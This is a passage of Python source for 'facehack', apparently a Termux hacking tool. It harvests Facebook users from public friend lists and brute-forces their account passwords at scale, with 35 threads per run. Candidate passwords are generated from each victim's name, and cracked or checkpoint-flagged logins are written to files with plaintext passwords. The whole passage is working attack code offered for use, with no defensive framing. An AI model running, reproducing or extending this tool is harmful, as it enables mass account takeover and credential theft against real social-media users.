                                if "Kedaluwarsa" in line.text:
                                    line=line.text.replace("Kedaluwarsa pada"," expires since")
                                    print(f'  {line} ({R}inactive{W})     ')
                                else:continue 
                        except:break
                        break
                    elif "checkpoint" in r.cookies.get_dict().keys():
                        if user in self.checked:break
                        self.checked.append(user)
                        open(file_checked,"a").write(user+"|"+pswd+"\n")
                        print(f'  {Y}LOGIN CHECKED{R}\n')
                        print(f'  {Y}fullname{W}: {name}')
                        print(f'  {Y}username{W}: {user}')
                        print(f'  {Y}password{W}: {pswd}')
                        print(f'  {Y}saved as{W}: {R}{file_checked}{W}\n')
                        break
                    else:
                        continue
                except(requests.exceptions.ConnectionError):
                    print(f'{R}  no internet connection waiting for connection stable   ',end="\r")
                    time.sleep(30)
                except(KeyboardInterrupt):exit(1)
    def process_async_tiktok(self,dump,expass):
        global progress,prog
        with Progress()as progress:
            prog=progress.add_task("",total=len(dump))
            with ThreadPoolExecutor(max_workers=35)as pool:
                for line in dump:
                    try:
                        data=line.split("|")
                        user=data[0]
                        name=data[1]
                        pswd=wordlist(name)
                        if len(expass)>0:
                            for line in expass:
                                pswd.append(line)
                        pool.submit(self.async_tiktok,user,name,pswd)
                    except(IndexError):
                        continue 
        print(f'\n  FACEHACK COMPLETE\n')
        print(f'{W}  total success: {str(len(self.success))}')
        print(f'{W}  total checked: {str(len(self.checked))}')
        print(f'{W}  total process: {str(self.process)}\n')
        print(f'{W}  dont forget to give a star and fork on github')
        print(f'{D}  https://github.com/termuxhackers-id/facehack/{W}\n')
    def process_async_instagram(self,dump,expass):
        global progress,prog
        with Progress()as progress:
            prog=progress.add_task("",total=len(dump))
            with ThreadPoolExecutor(max_workers=35)as pool:
                for line in dump:
                    try:
                        data=line.split("|")
                        user=data[0]
                        name=data[1]
                        pswd=wordlist(name)
                        if len(expass)>0:
                            for line in expass:
                                pswd.append(line)
                        pool.submit(self.async_instagram,user,name,pswd)
                    except(IndexError):
                        continue 
        print(f'\n  FACEHACK COMPLETE\n')
        print(f'{W}  total success: {str(len(self.success))}')
        print(f'{W}  total checked: {str(len(self.checked))}')
        print(f'{W}  total process: {str(self.process)}\n')
        print(f'{W}  dont forget to give a star and fork on github')
        print(f'{D}  https://github.com/termuxhackers-id/facehack/{W}\n')
    def config_bruteforce(self,data):
        dump=[]
        for _ in range(len(data)):
            line=random.choice(data)
            dump.append(line)
            data.remove(line)
        self.config={}
        print(f'  LIST OF LOGIN METHOD\n')
        print(f'{W}  1. login async tiktok')
        print(f'{W}  2. login async instagram')
        print(f'{W}  3. back\n')
        method=str(input(f'  select login method: '))
        if method=="1":self.config["method"]="tiktok"
        elif method=="2":self.config["method"]="instagram"
        elif method=="4":self.config["method"]="validate"
        else:self.main_menu()
        expass=str(input(f'\n  do you want to add {G}extra-password{W} (y/n): ')).lower()
        if expass=="y":
            print(f'\n  use comma as separator for multiple password')
            expass=str(input(f'  enter password: '))
            expass=expass.split(",")
        else:
            expass=[]
        if self.config["method"]=="tiktok":
            print(W)
            return self.process_async_tiktok(dump,expass)
        elif self.config["method"]=="instagram":
            print(W)
            return self.process_async_instagram(dump,expass)
        elif self.config["method"]=="validate":
            print(W)
            return self.process_validate(dump,expass)
        else:self.main_menu()
    def facedump(self):
        targetlist=[]
        file="data/dump/dump-"+str(time.strftime("%d%m%y_%H%M%S"))+".txt"
        print(f'\n  {W}FACEDUMP MENU{W}\n')
        print(f'  {W}1. from public friendlist ({G}uid{W}){W}')
        print(f'  {W}2. from public friendlist ({G}url{W}){W}')
        print(f'  {W}3. back{W}\n')
        menu=str(input(f'  select menu: '))
        if menu=="1":
            try:
                rank=int(input(f'\n  {W}range of target (max: 10):{W} '))
                if rank<11:rank=rank
                else:rank=1
            except:rank=1
            print(f'\n  {W}make sure the target friendship is not private{W}')
            print(f'  {W}type me to get id from your friendlist{W}\n')
            for i in range(rank):
                i+=1
                targetlist.append(str(input(f'{W}  enter user id ({str(i)}): ')))
            print(W)
            for target in targetlist:
                dump=self.get_friendlist_id(target)
                for line in dump:
                    self.dump.append(line)
            if len(self.dump)>0:
                for line in self.dump:
                    with open(file,"a")as f:
                        f.write(line+"\n")
                        f.close()
                print(f'  {W}success saved as: {R}{file}{W}\n')
                return self.dump
            else:
                print(f'  {R}no result found{W}\n')
                return False
        elif menu=="2":
            try:
                rank=int(input(f'\n  {W}range of target (max: 10):{W} '))
                if rank<11:rank=rank
                else:rank=1
            except:rank=1
            print(f'\n  {W}make sure the target friendship is not private{W}')
            print(f'  {W}type me to get id from your friendlist{W}\n')
            for i in range(rank):
                i+=1
                targetlist.append(str(input(f'{W}  enter url ({str(i)}): ')))
            print(W)
            for target in targetlist:
                resp=requests.get(target)
                fbid=re.search("\"pageID\":\"(.*?)\"",str(resp.text)).group(1)
                dump=self.get_friendlist_id(fbid)
                for line in dump:
                    self.dump.append(line)
            if len(self.dump)>0:
                for line in self.dump:
                    with open(file,"a")as f:
                        f.write(line+"\n")
                        f.close()
                print(f'  {W}success saved as: {R}{file}{W}\n')
                return self.dump
            else:
                print(f'  {R}no result found{W}\n')
                return False
        else:self.main_menu()
    def main_menu(self):
        self.dump=[]
        self.success=[]
        self.checked=[]
        self.process=0
        self.dump.clear()
        self.success.clear()
        self.checked.clear()
        banner()
        print(f'\n  {W}type ? or help to show available commands{W}\n')
        while True:
            user=str(input(f'  @{G}facehack{W}:~> '))
            if user=="?" or user=="help":
                print("\n  command              description\n")
                print("  clear                clear the entire screens")
                print("  token                show facebook auth token")
                print("  status               status license & cookies")
                print("  deldump              delete saved !dump files")
                print("  delrest              delete saved !rest files")
                print("  relogin              relogin with new cookies")
                print("  relicen              relogin with new license")
                print("  facedump             get public friendlist id")
                print("  facehack             run bruteforce passwords")
                print("  checkrest            check bruteforce results")
                print("  checkdump            check saved dump results\n")
                print(f'{W}  copyright © 2023 by termuxhackers-id\n')
            elif user=="token":
                print(f'\n  {W}FACEBOOK AUTH TOKEN\n\n{G}{self.token}{W}\n')
            elif user=="clear":
                os.system("cls" if os.name=="nt" else "clear")
                self.main_menu()
            elif user=="status":
                print(f'\n  {W}STATUS COOKIES{W}\n')
                for line in self.auth:
                    print(f'  {W}{line}: {self.auth[line]}{W}')
                print(f'\n  STATUS LICENSE\n')
                for line in self.keys:
                    print(f'  {W}{line}: {self.keys[line]}')
                print(W)
            elif user=="deldump":
                dumpfile=os.listdir("data/dump/")
                if len(dumpfile)>0:
                    asks=str(input(f'  {W}do you want to remove {str(len(dumpfile))} file (y/n): ')).lower()
                    print(W)
                    if asks=="y":
                        for line in dumpfile:
                            if os.path.isfile("data/dump/"+line):
                                os.remove("data/dump/"+line)
                                print(f'  {W}success deleted: {R}{line}{W}')
                            else:continue
                        print(W)
                    else:print(f'  {R}no file have been deleted{W}\n')
                else:print(f'\n  {R}no dump result found{W}\n')
            elif user=="delrest":
                restfile=os.listdir("data/rest/")
                if len(restfile)>0:
                    asks=str(input(f'  {W}do you want to remove {str(len(restfile))} file (y/n): ')).lower()
                    print(W)
                    if asks=="y":
                        for line in restfile:
                            if os.path.isfile("data/rest/"+line):
                                os.remove("data/rest/"+line)
                                print(f'  {W}success deleted: {R}{line}{W}')
                            else:continue
                        print(W)
                    else:print(f'  {R}no file have been deleted{W}\n')
                else:print(f'\n  {R}no result found{W}\n')
            elif user=="relogin":
                file="data/auth/cookies.txt"
                if os.path.isfile(file):os.remove(file)
                self.auth_login()
                print(W)
            elif user=="relicen":
                file="data/auth/license.key"
                if os.path.isfile(file):os.remove(file)
                license()
                print(W)
            elif user=="facedump":self.facedump()
            elif user=="facehack":
                dumpfile=os.listdir("data/dump/")
                print(f'\n  {W}FACEHACK MENU{W}\n')
                print(f'  {W}1. from public friendlist')
                print(f'  {W}2. from stored dump files ({str(len(dumpfile))})')
                print(f'  {W}3. back\n')
                menu=str(input(f'  select menu: '))
                if menu=="1":
                    dump=self.facedump()
                    if len(dump)>0:
                        return self.config_bruteforce(dump)
                elif menu=="2":
                    if len(dumpfile)>0:
                        i=0
                        print(f'\n  LIST OF FILES\n')
                        for line in dumpfile:
                            i+=1
                            c=str(len(open("data/dump/"+line,"r").read().splitlines()))
                            print(f'  {W}{str(i)}. {line} ({c})')
                        print(W)
                        try:
                            file=str(input(f'  select file: '))
                            print(W)
                            file="data/dump/"+dumpfile[int(file)-1]
                            if os.path.isfile(file):
                                dump=open(file,"r").read().splitlines()
                                return self.config_bruteforce(dump)
                            else:print(f'\n  {R}file not found{W}\n')
                        except(IndexError,FileNotFoundError):print(f'\n  {R}file not found{W}\n')
                    else:print(f'\n  {R}no dump result found{W}\n')
                else:self.main_menu()
            elif user=="checkrest":
                restfile=os.listdir("data/rest/")
                if len(restfile)>0:
                    i=0
                    print(f'\n  LIST OF FILES\n')
                    for line in restfile:
                        i+=1
                        c=str(len(open("data/rest/"+line,"r").read().splitlines()))
                        print(f'  {W}{str(i)}. {line} ({c})')
                    print(W)
                    try:
                        file=str(input(f'  select file: '))
                        file="data/rest/"+restfile[int(file)-1]
                        if os.path.isfile(file):
                            rest=open(file,"r").read().splitlines()
                            print(W)
                            for line in rest:
                                print(f'  {W}{line}{W}')
                            print(W)
                        else:print(f'\n  {R}file not found{W}\n')
                    except(IndexError,FileNotFoundError):print(f'\n  {R}file not found{W}\n')
                else:print(f'\n  {R}no result found{W}\n')
            elif user=="checkdump":
                dumpfile=os.listdir("data/dump/")
                if len(dumpfile)>0:
                    i=0
                    print(f'\n  LIST OF FILES\n')
                    for line in dumpfile:
                        i+=1
                        c=str(len(open("data/dump/"+line,"r").read().splitlines()))
                        print(f'  {W}{str(i)}. {line} ({c})')
                    print(W)
                    try:
                        file=str(input(f'  select file: '))
                        file="data/dump/"+dumpfile[int(file)-1]
                        if os.path.isfile(file):
                            dump=open(file,"r").read().splitlines()
                            print(W)
                            for line in dump:
                                print(f'  {W}{line}{W}')
                            print(W)
                        else:print(f'\n  {R}file not found{W}\n')
                    except(IndexError,FileNotFoundError):print(f'\n  {R}file not found{W}\n')
                else:print(f'\n  {R}no dump result found{W}\n')
            else:continue
if __name__=="__main__":
    try:facehack().main_menu()
    except KeyboardInterrupt:exit(1)
